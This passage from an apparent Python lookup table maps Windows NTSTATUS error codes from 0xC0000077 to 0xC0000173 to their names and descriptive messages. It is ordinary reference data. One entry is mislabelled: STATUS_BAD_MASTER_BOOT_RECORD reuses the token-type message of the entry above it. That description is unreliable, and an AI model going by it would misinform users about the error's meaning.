		0xC0000077: ("STATUS_INVALID_ACL","Indicates the ACL structure is not valid."),
		0xC0000078: ("STATUS_INVALID_SID","Indicates the SID structure is not valid."),
		0xC0000079: ("STATUS_INVALID_SECURITY_DESCR","Indicates the SECURITY_DESCRIPTOR structure is not valid."),
		0xC000007A: ("STATUS_PROCEDURE_NOT_FOUND","Indicates the specified procedure address cannot be found in the DLL."),
		0xC000007B: ("STATUS_INVALID_IMAGE_FORMAT","{Bad Image} %hs is either not designed to run on Windows or it contains an error. Try installing the program again using the original installation media or contact your system administrator or the software vendor for support."),
		0xC000007C: ("STATUS_NO_TOKEN","An attempt was made to reference a token that does not exist. This is typically done by referencing the token that is associated with a thread when the thread is not impersonating a client."),
		0xC000007D: ("STATUS_BAD_INHERITANCE_ACL","Indicates that an attempt to build either an inherited ACL or ACE was not successful. This can be caused by a number of things. One of the more probable causes is the replacement of a CreatorId with a SID that did not fit into the ACE or ACL."),
		0xC000007E: ("STATUS_RANGE_NOT_LOCKED","The range specified in NtUnlockFile was not locked."),
		0xC000007F: ("STATUS_DISK_FULL","An operation failed because the disk was full."),
		0xC0000080: ("STATUS_SERVER_DISABLED","The GUID allocation server is disabled at the moment."),
		0xC0000081: ("STATUS_SERVER_NOT_DISABLED","The GUID allocation server is enabled at the moment."),
		0xC0000082: ("STATUS_TOO_MANY_GUIDS_REQUESTED","Too many GUIDs were requested from the allocation server at once."),
		0xC0000083: ("STATUS_GUIDS_EXHAUSTED","The GUIDs could not be allocated because the Authority Agent was exhausted."),
		0xC0000084: ("STATUS_INVALID_ID_AUTHORITY","The value provided was an invalid value for an identifier authority."),
		0xC0000085: ("STATUS_AGENTS_EXHAUSTED","No more authority agent values are available for the particular identifier authority value."),
		0xC0000086: ("STATUS_INVALID_VOLUME_LABEL","An invalid volume label has been specified."),
		0xC0000087: ("STATUS_SECTION_NOT_EXTENDED","A mapped section could not be extended."),
		0xC0000088: ("STATUS_NOT_MAPPED_DATA","Specified section to flush does not map a data file."),
		0xC0000089: ("STATUS_RESOURCE_DATA_NOT_FOUND","Indicates the specified image file did not contain a resource section."),
		0xC000008A: ("STATUS_RESOURCE_TYPE_NOT_FOUND","Indicates the specified resource type cannot be found in the image file."),
		0xC000008B: ("STATUS_RESOURCE_NAME_NOT_FOUND","Indicates the specified resource name cannot be found in the image file."),
		0xC000008C: ("STATUS_ARRAY_BOUNDS_EXCEEDED","{EXCEPTION} Array bounds exceeded."),
		0xC000008D: ("STATUS_FLOAT_DENORMAL_OPERAND","{EXCEPTION} Floating-point denormal operand."),
		0xC000008E: ("STATUS_FLOAT_DIVIDE_BY_ZERO","{EXCEPTION} Floating-point division by zero."),
		0xC000008F: ("STATUS_FLOAT_INEXACT_RESULT","{EXCEPTION} Floating-point inexact result."),
		0xC0000090: ("STATUS_FLOAT_INVALID_OPERATION","{EXCEPTION} Floating-point invalid operation."),
		0xC0000091: ("STATUS_FLOAT_OVERFLOW","{EXCEPTION} Floating-point overflow."),
		0xC0000092: ("STATUS_FLOAT_STACK_CHECK","{EXCEPTION} Floating-point stack check."),
		0xC0000093: ("STATUS_FLOAT_UNDERFLOW","{EXCEPTION} Floating-point underflow."),
		0xC0000094: ("STATUS_INTEGER_DIVIDE_BY_ZERO","{EXCEPTION} Integer division by zero."),
		0xC0000095: ("STATUS_INTEGER_OVERFLOW","{EXCEPTION} Integer overflow."),
		0xC0000096: ("STATUS_PRIVILEGED_INSTRUCTION","{EXCEPTION} Privileged instruction."),
		0xC0000097: ("STATUS_TOO_MANY_PAGING_FILES","An attempt was made to install more paging files than the system supports."),
		0xC0000098: ("STATUS_FILE_INVALID","The volume for a file has been externally altered such that the opened file is no longer valid."),
		0xC0000099: ("STATUS_ALLOTTED_SPACE_EXCEEDED","When a block of memory is allotted for future updates, such as the memory allocated to hold discretionary access control and primary group information, successive updates may exceed the amount of memory originally allotted. Because a quota may already have been charged to several processes that have handles to the object, it is not reasonable to alter the size of the allocated memory. Instead, a request that requires more memory than has been allotted must fail and the STATUS_ALLOTTED_SPACE_EXCEEDED error returned."),
		0xC000009A: ("STATUS_INSUFFICIENT_RESOURCES","Insufficient system resources exist to complete the API."),
		0xC000009B: ("STATUS_DFS_EXIT_PATH_FOUND","An attempt has been made to open a DFS exit path control file."),
		0xC000009C: ("STATUS_DEVICE_DATA_ERROR","There are bad blocks (sectors) on the hard disk."),
		0xC000009D: ("STATUS_DEVICE_NOT_CONNECTED","There is bad cabling, non-termination, or the controller is not able to obtain access to the hard disk."),
		0xC000009F: ("STATUS_FREE_VM_NOT_AT_BASE","Virtual memory cannot be freed because the base address is not the base of the region and a region size of zero was specified."),
		0xC00000A0: ("STATUS_MEMORY_NOT_ALLOCATED","An attempt was made to free virtual memory that is not allocated."),
		0xC00000A1: ("STATUS_WORKING_SET_QUOTA","The working set is not big enough to allow the requested pages to be locked."),
		0xC00000A2: ("STATUS_MEDIA_WRITE_PROTECTED","{Write Protect Error} The disk cannot be written to because it is write-protected. Remove the write protection from the volume %hs in drive %hs."),
		0xC00000A3: ("STATUS_DEVICE_NOT_READY","{Drive Not Ready} The drive is not ready for use; its door may be open. Check drive %hs and make sure that a disk is inserted and that the drive door is closed."),
		0xC00000A4: ("STATUS_INVALID_GROUP_ATTRIBUTES","The specified attributes are invalid or are incompatible with the attributes for the group as a whole."),
		0xC00000A5: ("STATUS_BAD_IMPERSONATION_LEVEL","A specified impersonation level is invalid. Also used to indicate that a required impersonation level was not provided."),
		0xC00000A6: ("STATUS_CANT_OPEN_ANONYMOUS","An attempt was made to open an anonymous-level token. Anonymous tokens may not be opened."),
		0xC00000A7: ("STATUS_BAD_VALIDATION_CLASS","The validation information class requested was invalid."),
		0xC00000A8: ("STATUS_BAD_TOKEN_TYPE","The type of a token object is inappropriate for its attempted use."),
		0xC00000A9: ("STATUS_BAD_MASTER_BOOT_RECORD","The type of a token object is inappropriate for its attempted use."),
		0xC00000AA: ("STATUS_INSTRUCTION_MISALIGNMENT","An attempt was made to execute an instruction at an unaligned address and the host system does not support unaligned instruction references."),
		0xC00000AB: ("STATUS_INSTANCE_NOT_AVAILABLE","The maximum named pipe instance count has been reached."),
		0xC00000AC: ("STATUS_PIPE_NOT_AVAILABLE","An instance of a named pipe cannot be found in the listening state."),
		0xC00000AD: ("STATUS_INVALID_PIPE_STATE","The named pipe is not in the connected or closing state."),
		0xC00000AE: ("STATUS_PIPE_BUSY","The specified pipe is set to complete operations and there are current I/O operations queued so that it cannot be changed to queue operations."),
		0xC00000AF: ("STATUS_ILLEGAL_FUNCTION","The specified handle is not open to the server end of the named pipe."),
		0xC00000B0: ("STATUS_PIPE_DISCONNECTED","The specified named pipe is in the disconnected state."),
		0xC00000B1: ("STATUS_PIPE_CLOSING","The specified named pipe is in the closing state."),
		0xC00000B2: ("STATUS_PIPE_CONNECTED","The specified named pipe is in the connected state."),
		0xC00000B3: ("STATUS_PIPE_LISTENING","The specified named pipe is in the listening state."),
		0xC00000B4: ("STATUS_INVALID_READ_MODE","The specified named pipe is not in message mode."),
		0xC00000B5: ("STATUS_IO_TIMEOUT","{Device Timeout} The specified I/O operation on %hs was not completed before the time-out period expired."),
		0xC00000B6: ("STATUS_FILE_FORCED_CLOSED","The specified file has been closed by another process."),
		0xC00000B7: ("STATUS_PROFILING_NOT_STARTED","Profiling is not started."),
		0xC00000B8: ("STATUS_PROFILING_NOT_STOPPED","Profiling is not stopped."),
		0xC00000B9: ("STATUS_COULD_NOT_INTERPRET","The passed ACL did not contain the minimum required information."),
		0xC00000BA: ("STATUS_FILE_IS_A_DIRECTORY","The file that was specified as a target is a directory, and the caller specified that it could be anything but a directory."),
		0xC00000BB: ("STATUS_NOT_SUPPORTED","The request is not supported."),
		0xC00000BC: ("STATUS_REMOTE_NOT_LISTENING","This remote computer is not listening."),
		0xC00000BD: ("STATUS_DUPLICATE_NAME","A duplicate name exists on the network."),
		0xC00000BE: ("STATUS_BAD_NETWORK_PATH","The network path cannot be located."),
		0xC00000BF: ("STATUS_NETWORK_BUSY","The network is busy."),
		0xC00000C0: ("STATUS_DEVICE_DOES_NOT_EXIST","This device does not exist."),
		0xC00000C1: ("STATUS_TOO_MANY_COMMANDS","The network BIOS command limit has been reached."),
		0xC00000C2: ("STATUS_ADAPTER_HARDWARE_ERROR","An I/O adapter hardware error has occurred."),
		0xC00000C3: ("STATUS_INVALID_NETWORK_RESPONSE","The network responded incorrectly."),
		0xC00000C4: ("STATUS_UNEXPECTED_NETWORK_ERROR","An unexpected network error occurred."),
		0xC00000C5: ("STATUS_BAD_REMOTE_ADAPTER","The remote adapter is not compatible."),
		0xC00000C6: ("STATUS_PRINT_QUEUE_FULL","The print queue is full."),
		0xC00000C7: ("STATUS_NO_SPOOL_SPACE","Space to store the file that is waiting to be printed is not available on the server."),
		0xC00000C8: ("STATUS_PRINT_CANCELLED","The requested print file has been canceled."),
		0xC00000C9: ("STATUS_NETWORK_NAME_DELETED","The network name was deleted."),
		0xC00000CA: ("STATUS_NETWORK_ACCESS_DENIED","Network access is denied."),
		0xC00000CB: ("STATUS_BAD_DEVICE_TYPE","{Incorrect Network Resource Type} The specified device type (LPT, for example) conflicts with the actual device type on the remote resource."),
		0xC00000CC: ("STATUS_BAD_NETWORK_NAME","{Network Name Not Found} The specified share name cannot be found on the remote server."),
		0xC00000CD: ("STATUS_TOO_MANY_NAMES","The name limit for the network adapter card of the local computer was exceeded."),
		0xC00000CE: ("STATUS_TOO_MANY_SESSIONS","The network BIOS session limit was exceeded."),
		0xC00000CF: ("STATUS_SHARING_PAUSED","File sharing has been temporarily paused."),
		0xC00000D0: ("STATUS_REQUEST_NOT_ACCEPTED","No more connections can be made to this remote computer at this time because the computer has already accepted the maximum number of connections."),
		0xC00000D1: ("STATUS_REDIRECTOR_PAUSED","Print or disk redirection is temporarily paused."),
		0xC00000D2: ("STATUS_NET_WRITE_FAULT","A network data fault occurred."),
		0xC00000D3: ("STATUS_PROFILING_AT_LIMIT","The number of active profiling objects is at the maximum and no more may be started."),
		0xC00000D4: ("STATUS_NOT_SAME_DEVICE","{Incorrect Volume} The destination file of a rename request is located on a different device than the source of the rename request."),
		0xC00000D5: ("STATUS_FILE_RENAMED","The specified file has been renamed and thus cannot be modified."),
		0xC00000D6: ("STATUS_VIRTUAL_CIRCUIT_CLOSED","{Network Request Timeout} The session with a remote server has been disconnected because the time-out interval for a request has expired."),
		0xC00000D7: ("STATUS_NO_SECURITY_ON_OBJECT","Indicates an attempt was made to operate on the security of an object that does not have security associated with it."),
		0xC00000D8: ("STATUS_CANT_WAIT","Used to indicate that an operation cannot continue without blocking for I/O."),
		0xC00000D9: ("STATUS_PIPE_EMPTY","Used to indicate that a read operation was done on an empty pipe."),
		0xC00000DA: ("STATUS_CANT_ACCESS_DOMAIN_INFO","Configuration information could not be read from the domain controller, either because the machine is unavailable or access has been denied."),
		0xC00000DB: ("STATUS_CANT_TERMINATE_SELF","Indicates that a thread attempted to terminate itself by default (called NtTerminateThread with NULL) and it was the last thread in the current process."),
		0xC00000DC: ("STATUS_INVALID_SERVER_STATE","Indicates the Sam Server was in the wrong state to perform the desired operation."),
		0xC00000DD: ("STATUS_INVALID_DOMAIN_STATE","Indicates the domain was in the wrong state to perform the desired operation."),
		0xC00000DE: ("STATUS_INVALID_DOMAIN_ROLE","This operation is only allowed for the primary domain controller of the domain."),
		0xC00000DF: ("STATUS_NO_SUCH_DOMAIN","The specified domain did not exist."),
		0xC00000E0: ("STATUS_DOMAIN_EXISTS","The specified domain already exists."),
		0xC00000E1: ("STATUS_DOMAIN_LIMIT_EXCEEDED","An attempt was made to exceed the limit on the number of domains per server for this release."),
		0xC00000E2: ("STATUS_OPLOCK_NOT_GRANTED","An error status returned when the opportunistic lock (oplock) request is denied."),
		0xC00000E3: ("STATUS_INVALID_OPLOCK_PROTOCOL","An error status returned when an invalid opportunistic lock (oplock) acknowledgment is received by a file system."),
		0xC00000E4: ("STATUS_INTERNAL_DB_CORRUPTION","This error indicates that the requested operation cannot be completed due to a catastrophic media failure or an on-disk data structure corruption."),
		0xC00000E5: ("STATUS_INTERNAL_ERROR","An internal error occurred."),
		0xC00000E6: ("STATUS_GENERIC_NOT_MAPPED","Indicates generic access types were contained in an access mask which should already be mapped to non-generic access types."),
		0xC00000E7: ("STATUS_BAD_DESCRIPTOR_FORMAT","Indicates a security descriptor is not in the necessary format (absolute or self-relative)."),
		0xC00000E8: ("STATUS_INVALID_USER_BUFFER","An access to a user buffer failed at an expected point in time. This code is defined because the caller does not want to accept STATUS_ACCESS_VIOLATION in its filter."),
		0xC00000E9: ("STATUS_UNEXPECTED_IO_ERROR","If an I/O error that is not defined in the standard FsRtl filter is returned, it is converted to the following error, which is guaranteed to be in the filter. In this case, information is lost; however, the filter correctly handles the exception."),
		0xC00000EA: ("STATUS_UNEXPECTED_MM_CREATE_ERR","If an MM error that is not defined in the standard FsRtl filter is returned, it is converted to one of the following errors, which are guaranteed to be in the filter. In this case, information is lost; however, the filter correctly handles the exception."),
		0xC00000EB: ("STATUS_UNEXPECTED_MM_MAP_ERROR","If an MM error that is not defined in the standard FsRtl filter is returned, it is converted to one of the following errors, which are guaranteed to be in the filter. In this case, information is lost; however, the filter correctly handles the exception."),
		0xC00000EC: ("STATUS_UNEXPECTED_MM_EXTEND_ERR","If an MM error that is not defined in the standard FsRtl filter is returned, it is converted to one of the following errors, which are guaranteed to be in the filter. In this case, information is lost; however, the filter correctly handles the exception."),
		0xC00000ED: ("STATUS_NOT_LOGON_PROCESS","The requested action is restricted for use by logon processes only. The calling process has not registered as a logon process."),
		0xC00000EE: ("STATUS_LOGON_SESSION_EXISTS","An attempt has been made to start a new session manager or LSA logon session by using an ID that is already in use."),
		0xC00000EF: ("STATUS_INVALID_PARAMETER_1","An invalid parameter was passed to a service or function as the first argument."),
		0xC00000F0: ("STATUS_INVALID_PARAMETER_2","An invalid parameter was passed to a service or function as the second argument."),
		0xC00000F1: ("STATUS_INVALID_PARAMETER_3","An invalid parameter was passed to a service or function as the third argument."),
		0xC00000F2: ("STATUS_INVALID_PARAMETER_4","An invalid parameter was passed to a service or function as the fourth argument."),
		0xC00000F3: ("STATUS_INVALID_PARAMETER_5","An invalid parameter was passed to a service or function as the fifth argument."),
		0xC00000F4: ("STATUS_INVALID_PARAMETER_6","An invalid parameter was passed to a service or function as the sixth argument."),
		0xC00000F5: ("STATUS_INVALID_PARAMETER_7","An invalid parameter was passed to a service or function as the seventh argument."),
		0xC00000F6: ("STATUS_INVALID_PARAMETER_8","An invalid parameter was passed to a service or function as the eighth argument."),
		0xC00000F7: ("STATUS_INVALID_PARAMETER_9","An invalid parameter was passed to a service or function as the ninth argument."),
		0xC00000F8: ("STATUS_INVALID_PARAMETER_10","An invalid parameter was passed to a service or function as the tenth argument."),
		0xC00000F9: ("STATUS_INVALID_PARAMETER_11","An invalid parameter was passed to a service or function as the eleventh argument."),
		0xC00000FA: ("STATUS_INVALID_PARAMETER_12","An invalid parameter was passed to a service or function as the twelfth argument."),
		0xC00000FB: ("STATUS_REDIRECTOR_NOT_STARTED","An attempt was made to access a network file, but the network software was not yet started."),
		0xC00000FC: ("STATUS_REDIRECTOR_STARTED","An attempt was made to start the redirector, but the redirector has already been started."),
		0xC00000FD: ("STATUS_STACK_OVERFLOW","A new guard page for the stack cannot be created."),
		0xC00000FE: ("STATUS_NO_SUCH_PACKAGE","A specified authentication package is unknown."),
		0xC00000FF: ("STATUS_BAD_FUNCTION_TABLE","A malformed function table was encountered during an unwind operation."),
		0xC0000100: ("STATUS_VARIABLE_NOT_FOUND","Indicates the specified environment variable name was not found in the specified environment block."),
		0xC0000101: ("STATUS_DIRECTORY_NOT_EMPTY","Indicates that the directory trying to be deleted is not empty."),
		0xC0000102: ("STATUS_FILE_CORRUPT_ERROR","{Corrupt File} The file or directory %hs is corrupt and unreadable. Run the Chkdsk utility."),
		0xC0000103: ("STATUS_NOT_A_DIRECTORY","A requested opened file is not a directory."),
		0xC0000104: ("STATUS_BAD_LOGON_SESSION_STATE","The logon session is not in a state that is consistent with the requested operation."),
		0xC0000105: ("STATUS_LOGON_SESSION_COLLISION","An internal LSA error has occurred. An authentication package has requested the creation of a logon session but the ID of an already existing logon session has been specified."),
		0xC0000106: ("STATUS_NAME_TOO_LONG","A specified name string is too long for its intended use."),
		0xC0000107: ("STATUS_FILES_OPEN","The user attempted to force close the files on a redirected drive, but there were opened files on the drive, and the user did not specify a sufficient level of force."),
		0xC0000108: ("STATUS_CONNECTION_IN_USE","The user attempted to force close the files on a redirected drive, but there were opened directories on the drive, and the user did not specify a sufficient level of force."),
		0xC0000109: ("STATUS_MESSAGE_NOT_FOUND","RtlFindMessage could not locate the requested message ID in the message table resource."),
		0xC000010A: ("STATUS_PROCESS_IS_TERMINATING","An attempt was made to duplicate an object handle into or out of an exiting process."),
		0xC000010B: ("STATUS_INVALID_LOGON_TYPE","Indicates an invalid value has been provided for the LogonType requested."),
		0xC000010C: ("STATUS_NO_GUID_TRANSLATION","Indicates that an attempt was made to assign protection to a file system file or directory and one of the SIDs in the security descriptor could not be translated into a GUID that could be stored by the file system. This causes the protection attempt to fail, which may cause a file creation attempt to fail."),
		0xC000010D: ("STATUS_CANNOT_IMPERSONATE","Indicates that an attempt has been made to impersonate via a named pipe that has not yet been read from."),
		0xC000010E: ("STATUS_IMAGE_ALREADY_LOADED","Indicates that the specified image is already loaded."),
		0xC0000117: ("STATUS_NO_LDT","Indicates that an attempt was made to change the size of the LDT for a process that has no LDT."),
		0xC0000118: ("STATUS_INVALID_LDT_SIZE","Indicates that an attempt was made to grow an LDT by setting its size, or that the size was not an even number of selectors."),
		0xC0000119: ("STATUS_INVALID_LDT_OFFSET","Indicates that the starting value for the LDT information was not an integral multiple of the selector size."),
		0xC000011A: ("STATUS_INVALID_LDT_DESCRIPTOR","Indicates that the user supplied an invalid descriptor when trying to set up LDT descriptors."),
		0xC000011B: ("STATUS_INVALID_IMAGE_NE_FORMAT","The specified image file did not have the correct format. It appears to be NE format."),
		0xC000011C: ("STATUS_RXACT_INVALID_STATE","Indicates that the transaction state of a registry subtree is incompatible with the requested operation. For example, a request has been made to start a new transaction with one already in progress, or a request has been made to apply a transaction when one is not currently in progress."),
		0xC000011D: ("STATUS_RXACT_COMMIT_FAILURE","Indicates an error has occurred during a registry transaction commit. The database has been left in an unknown, but probably inconsistent, state. The state of the registry transaction is left as COMMITTING."),
		0xC000011E: ("STATUS_MAPPED_FILE_SIZE_ZERO","An attempt was made to map a file of size zero with the maximum size specified as zero."),
		0xC000011F: ("STATUS_TOO_MANY_OPENED_FILES","Too many files are opened on a remote server. This error should only be returned by the Windows redirector on a remote drive."),
		0xC0000120: ("STATUS_CANCELLED","The I/O request was canceled."),
		0xC0000121: ("STATUS_CANNOT_DELETE","An attempt has been made to remove a file or directory that cannot be deleted."),
		0xC0000122: ("STATUS_INVALID_COMPUTER_NAME","Indicates a name that was specified as a remote computer name is syntactically invalid."),
		0xC0000123: ("STATUS_FILE_DELETED","An I/O request other than close was performed on a file after it was deleted, which can only happen to a request that did not complete before the last handle was closed via NtClose."),
		0xC0000124: ("STATUS_SPECIAL_ACCOUNT","Indicates an operation that is incompatible with built-in accounts has been attempted on a built-in (special) SAM account. For example, built-in accounts cannot be deleted."),
		0xC0000125: ("STATUS_SPECIAL_GROUP","The operation requested may not be performed on the specified group because it is a built-in special group."),
		0xC0000126: ("STATUS_SPECIAL_USER","The operation requested may not be performed on the specified user because it is a built-in special user."),
		0xC0000127: ("STATUS_MEMBERS_PRIMARY_GROUP","Indicates a member cannot be removed from a group because the group is currently the member's primary group."),
		0xC0000128: ("STATUS_FILE_CLOSED","An I/O request other than close and several other special case operations was attempted using a file object that had already been closed."),
		0xC0000129: ("STATUS_TOO_MANY_THREADS","Indicates a process has too many threads to perform the requested action. For example, assignment of a primary token may only be performed when a process has zero or one threads."),
		0xC000012A: ("STATUS_THREAD_NOT_IN_PROCESS","An attempt was made to operate on a thread within a specific process, but the specified thread is not in the specified process."),
		0xC000012B: ("STATUS_TOKEN_ALREADY_IN_USE","An attempt was made to establish a token for use as a primary token but the token is already in use. A token can only be the primary token of one process at a time."),
		0xC000012C: ("STATUS_PAGEFILE_QUOTA_EXCEEDED","The page file quota was exceeded."),
		0xC000012D: ("STATUS_COMMITMENT_LIMIT","{Out of Virtual Memory} Your system is low on virtual memory. To ensure that Windows runs correctly, increase the size of your virtual memory paging file. For more information, see Help."),
		0xC000012E: ("STATUS_INVALID_IMAGE_LE_FORMAT","The specified image file did not have the correct format: it appears to be LE format."),
		0xC000012F: ("STATUS_INVALID_IMAGE_NOT_MZ","The specified image file did not have the correct format: it did not have an initial MZ."),
		0xC0000130: ("STATUS_INVALID_IMAGE_PROTECT","The specified image file did not have the correct format: it did not have a proper e_lfarlc in the MZ header."),
		0xC0000131: ("STATUS_INVALID_IMAGE_WIN_16","The specified image file did not have the correct format: it appears to be a 16-bit Windows image."),
		0xC0000132: ("STATUS_LOGON_SERVER_CONFLICT","The Netlogon service cannot start because another Netlogon service running in the domain conflicts with the specified role."),
		0xC0000133: ("STATUS_TIME_DIFFERENCE_AT_DC","The time at the primary domain controller is different from the time at the backup domain controller or member server by too large an amount."),
		0xC0000134: ("STATUS_SYNCHRONIZATION_REQUIRED","The SAM database on a Windows Server is significantly out of synchronization with the copy on the domain controller. A complete synchronization is required."),
		0xC0000135: ("STATUS_DLL_NOT_FOUND","{Unable To Locate Component} This application has failed to start because %hs was not found. Reinstalling the application may fix this problem."),
		0xC0000136: ("STATUS_OPEN_FAILED","The NtCreateFile API failed. This error should never be returned to an application; it is a place holder for the Windows LAN Manager Redirector to use in its internal error-mapping routines."),
		0xC0000137: ("STATUS_IO_PRIVILEGE_FAILED","{Privilege Failed} The I/O permissions for the process could not be changed."),
		0xC0000138: ("STATUS_ORDINAL_NOT_FOUND","{Ordinal Not Found} The ordinal %ld could not be located in the dynamic link library %hs."),
		0xC0000139: ("STATUS_ENTRYPOINT_NOT_FOUND","{Entry Point Not Found} The procedure entry point %hs could not be located in the dynamic link library %hs."),
		0xC000013A: ("STATUS_CONTROL_C_EXIT","{Application Exit by CTRL+C} The application terminated as a result of a CTRL+C."),
		0xC000013B: ("STATUS_LOCAL_DISCONNECT","{Virtual Circuit Closed} The network transport on your computer has closed a network connection. There may or may not be I/O requests outstanding."),
		0xC000013C: ("STATUS_REMOTE_DISCONNECT","{Virtual Circuit Closed} The network transport on a remote computer has closed a network connection. There may or may not be I/O requests outstanding."),
		0xC000013D: ("STATUS_REMOTE_RESOURCES","{Insufficient Resources on Remote Computer} The remote computer has insufficient resources to complete the network request. For example, the remote computer may not have enough available memory to carry out the request at this time."),
		0xC000013E: ("STATUS_LINK_FAILED","{Virtual Circuit Closed} An existing connection (virtual circuit) has been broken at the remote computer. There is probably something wrong with the network software protocol or the network hardware on the remote computer."),
		0xC000013F: ("STATUS_LINK_TIMEOUT","{Virtual Circuit Closed} The network transport on your computer has closed a network connection because it had to wait too long for a response from the remote computer."),
		0xC0000140: ("STATUS_INVALID_CONNECTION","The connection handle that was given to the transport was invalid."),
		0xC0000141: ("STATUS_INVALID_ADDRESS","The address handle that was given to the transport was invalid."),
		0xC0000142: ("STATUS_DLL_INIT_FAILED","{DLL Initialization Failed} Initialization of the dynamic link library %hs failed. The process is terminating abnormally."),
		0xC0000143: ("STATUS_MISSING_SYSTEMFILE","{Missing System File} The required system file %hs is bad or missing."),
		0xC0000144: ("STATUS_UNHANDLED_EXCEPTION","{Application Error} The exception %s (0x%08lx) occurred in the application at location 0x%08lx."),
		0xC0000145: ("STATUS_APP_INIT_FAILURE","{Application Error} The application failed to initialize properly (0x%lx). Click OK to terminate the application."),
		0xC0000146: ("STATUS_PAGEFILE_CREATE_FAILED","{Unable to Create Paging File} The creation of the paging file %hs failed (%lx). The requested size was %ld."),
		0xC0000147: ("STATUS_NO_PAGEFILE","{No Paging File Specified} No paging file was specified in the system configuration."),
		0xC0000148: ("STATUS_INVALID_LEVEL","{Incorrect System Call Level} An invalid level was passed into the specified system call."),
		0xC0000149: ("STATUS_WRONG_PASSWORD_CORE","{Incorrect Password to LAN Manager Server} You specified an incorrect password to a LAN Manager 2.x or MS-NET server."),
		0xC000014A: ("STATUS_ILLEGAL_FLOAT_CONTEXT","{EXCEPTION} A real-mode application issued a floating-point instruction and floating-point hardware is not present."),
		0xC000014B: ("STATUS_PIPE_BROKEN","The pipe operation has failed because the other end of the pipe has been closed."),
		0xC000014C: ("STATUS_REGISTRY_CORRUPT","{The Registry Is Corrupt} The structure of one of the files that contains registry data is corrupt; the image of the file in memory is corrupt; or the file could not be recovered because the alternate copy or log was absent or corrupt."),
		0xC000014D: ("STATUS_REGISTRY_IO_FAILED","An I/O operation initiated by the Registry failed and cannot be recovered. The registry could not read in, write out, or flush one of the files that contain the system's image of the registry."),
		0xC000014E: ("STATUS_NO_EVENT_PAIR","An event pair synchronization operation was performed using the thread-specific client/server event pair object, but no event pair object was associated with the thread."),
		0xC000014F: ("STATUS_UNRECOGNIZED_VOLUME","The volume does not contain a recognized file system. Be sure that all required file system drivers are loaded and that the volume is not corrupt."),
		0xC0000150: ("STATUS_SERIAL_NO_DEVICE_INITED","No serial device was successfully initialized. The serial driver will unload."),
		0xC0000151: ("STATUS_NO_SUCH_ALIAS","The specified local group does not exist."),
		0xC0000152: ("STATUS_MEMBER_NOT_IN_ALIAS","The specified account name is not a member of the group."),
		0xC0000153: ("STATUS_MEMBER_IN_ALIAS","The specified account name is already a member of the group."),
		0xC0000154: ("STATUS_ALIAS_EXISTS","The specified local group already exists."),
		0xC0000155: ("STATUS_LOGON_NOT_GRANTED","A requested type of logon (for example, interactive, network, and service) is not granted by the local security policy of the target system. Ask the system administrator to grant the necessary form of logon."),
		0xC0000156: ("STATUS_TOO_MANY_SECRETS","The maximum number of secrets that may be stored in a single system was exceeded. The length and number of secrets is limited to satisfy U.S. State Department export restrictions."),
		0xC0000157: ("STATUS_SECRET_TOO_LONG","The length of a secret exceeds the maximum allowable length. The length and number of secrets is limited to satisfy U.S. State Department export restrictions."),
		0xC0000158: ("STATUS_INTERNAL_DB_ERROR","The local security authority (LSA) database contains an internal inconsistency."),
		0xC0000159: ("STATUS_FULLSCREEN_MODE","The requested operation cannot be performed in full-screen mode."),
		0xC000015A: ("STATUS_TOO_MANY_CONTEXT_IDS","During a logon attempt, the user's security context accumulated too many security IDs. This is a very unusual situation. Remove the user from some global or local groups to reduce the number of security IDs to incorporate into the security context."),
		0xC000015B: ("STATUS_LOGON_TYPE_NOT_GRANTED","A user has requested a type of logon (for example, interactive or network) that has not been granted. An administrator has control over who may logon interactively and through the network."),
		0xC000015C: ("STATUS_NOT_REGISTRY_FILE","The system has attempted to load or restore a file into the registry, and the specified file is not in the format of a registry file."),
		0xC000015D: ("STATUS_NT_CROSS_ENCRYPTION_REQUIRED","An attempt was made to change a user password in the security account manager without providing the necessary Windows cross-encrypted password."),
		0xC000015E: ("STATUS_DOMAIN_CTRLR_CONFIG_ERROR","A Windows Server has an incorrect configuration."),
		0xC000015F: ("STATUS_FT_MISSING_MEMBER","An attempt was made to explicitly access the secondary copy of information via a device control to the fault tolerance driver and the secondary copy is not present in the system."),
		0xC0000160: ("STATUS_ILL_FORMED_SERVICE_ENTRY","A configuration registry node that represents a driver service entry was ill-formed and did not contain the required value entries."),
		0xC0000161: ("STATUS_ILLEGAL_CHARACTER","An illegal character was encountered. For a multibyte character set, this includes a lead byte without a succeeding trail byte. For the Unicode character set this includes the characters 0xFFFF and 0xFFFE."),
		0xC0000162: ("STATUS_UNMAPPABLE_CHARACTER","No mapping for the Unicode character exists in the target multibyte code page."),
		0xC0000163: ("STATUS_UNDEFINED_CHARACTER","The Unicode character is not defined in the Unicode character set that is installed on the system."),
		0xC0000164: ("STATUS_FLOPPY_VOLUME","The paging file cannot be created on a floppy disk."),
		0xC0000165: ("STATUS_FLOPPY_ID_MARK_NOT_FOUND","{Floppy Disk Error} While accessing a floppy disk, an ID address mark was not found."),
		0xC0000166: ("STATUS_FLOPPY_WRONG_CYLINDER","{Floppy Disk Error} While accessing a floppy disk, the track address from the sector ID field was found to be different from the track address that is maintained by the controller."),
		0xC0000167: ("STATUS_FLOPPY_UNKNOWN_ERROR","{Floppy Disk Error} The floppy disk controller reported an error that is not recognized by the floppy disk driver."),
		0xC0000168: ("STATUS_FLOPPY_BAD_REGISTERS","{Floppy Disk Error} While accessing a floppy-disk, the controller returned inconsistent results via its registers."),
		0xC0000169: ("STATUS_DISK_RECALIBRATE_FAILED","{Hard Disk Error} While accessing the hard disk, a recalibrate operation failed, even after retries."),
		0xC000016A: ("STATUS_DISK_OPERATION_FAILED","{Hard Disk Error} While accessing the hard disk, a disk operation failed even after retries."),
		0xC000016B: ("STATUS_DISK_RESET_FAILED","{Hard Disk Error} While accessing the hard disk, a disk controller reset was needed, but even that failed."),
		0xC000016C: ("STATUS_SHARED_IRQ_BUSY","An attempt was made to open a device that was sharing an interrupt request (IRQ) with other devices. At least one other device that uses that IRQ was already opened. Two concurrent opens of devices that share an IRQ and only work via interrupts is not supported for the particular bus type that the devices use."),
		0xC000016D: ("STATUS_FT_ORPHANING","{FT Orphaning} A disk that is part of a fault-tolerant volume can no longer be accessed."),
		0xC000016E: ("STATUS_BIOS_FAILED_TO_CONNECT_INTERRUPT","The basic input/output system (BIOS) failed to connect a system interrupt to the device or bus for which the device is connected."),
		0xC0000172: ("STATUS_PARTITION_FAILURE","The tape could not be partitioned."),
		0xC0000173: ("STATUS_INVALID_BLOCK_LENGTH","When accessing a new tape of a multi-volume partition, the current blocksize is incorrect."),
